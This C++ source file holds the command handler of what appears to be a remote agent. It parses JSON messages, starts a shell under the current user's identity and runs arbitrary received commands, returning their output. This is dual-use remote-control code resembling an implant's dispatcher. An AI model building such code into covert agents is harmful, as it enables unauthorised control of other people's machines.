#define NOMINMAX

#include "CommandHandler.h"
#include "Logger/GlobalLogger.h"
#include <algorithm>
#include <rapidjson/document.h>
#include <rapidjson/writer.h>
#include <rapidjson/stringbuffer.h>

using namespace CppAgent;

namespace {
    std::string make_response(bool success,
        const std::string* output = nullptr,
        const char* error = nullptr) {
        rapidjson::Document d;
        d.SetObject();
        auto& alloc = d.GetAllocator();
        d.AddMember("success", success, alloc);

        if (output) {
            rapidjson::Value data(rapidjson::kObjectType);
            data.AddMember("output", rapidjson::Value(output->c_str(), alloc), alloc);
            d.AddMember("data", data, alloc);
        }
        else {
            d.AddMember("data", rapidjson::Value(rapidjson::kNullType), alloc);
        }

        if (error) {
            d.AddMember("error", rapidjson::Value(error, alloc), alloc);
        }
        else {
            d.AddMember("error", rapidjson::Value(rapidjson::kNullType), alloc);
        }

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        d.Accept(writer);
        return buffer.GetString();
    }
} // namespace

CommandHandler::CommandHandler() : shell_running_(false) {}

std::string CommandHandler::handle(const std::string& commandJson) {
	DARKSCRY_LOG("Received command: " + commandJson, Logger::Level::Debug);
    rapidjson::Document doc;
    if (doc.Parse(commandJson.c_str()).HasParseError() || !doc.IsObject()) {
        DARKSCRY_LOG("Invalid JSON", Logger::Level::Warning);
        return make_response(false, nullptr, "invalid json");
    }

    int action = 0;
    if (doc.HasMember("action_id") && doc["action_id"].IsInt())
        action = doc["action_id"].GetInt();
    else if (doc.HasMember("action") && doc["action"].IsInt())
        action = doc["action"].GetInt();
    else {
        DARKSCRY_LOG("No action provided", Logger::Level::Warning);
        return make_response(false, nullptr, "missing action");
    }

    if (action == START_SHELL_INSTANCE) {
#ifdef _WIN32
        if (!shell_)
            shell_ = std::make_unique<win32::Shell>();
        shell_running_ = shell_->create_by_sid(L"CURRENT_USER");
#else
        shell_running_ = true;
#endif
        if (!shell_running_) {
            return make_response(false, nullptr, "failed to start shell");
        }
        DARKSCRY_LOG("Start shell instance requested", Logger::Level::Info);
        return make_response(true);
    }
    else if (action == RUN_COMMAND) {
        if (!shell_running_) {
            DARKSCRY_LOG("Run command but shell not running", Logger::Level::Warning);
            return make_response(false, nullptr, "Shell is not running");
        }

        std::string cmd;
        if (doc.HasMember("command")) {
            auto& c = doc["command"];
            if (c.IsObject() && c.HasMember("command") && c["command"].IsString())
                cmd = c["command"].GetString();
            else if (c.IsString())
                cmd = c.GetString();
        }

        DARKSCRY_LOG("Run command: " + cmd, Logger::Level::Debug);
#ifdef _WIN32
        std::string output = shell_->run_command(cmd);
#else
        std::string output = cmd; // placeholder
#endif
        return make_response(true, &output);
    }

    DARKSCRY_LOG("Unknown action: " + std::to_string(action), Logger::Level::Warning);
    return make_response(false, nullptr, "unknown action");
}

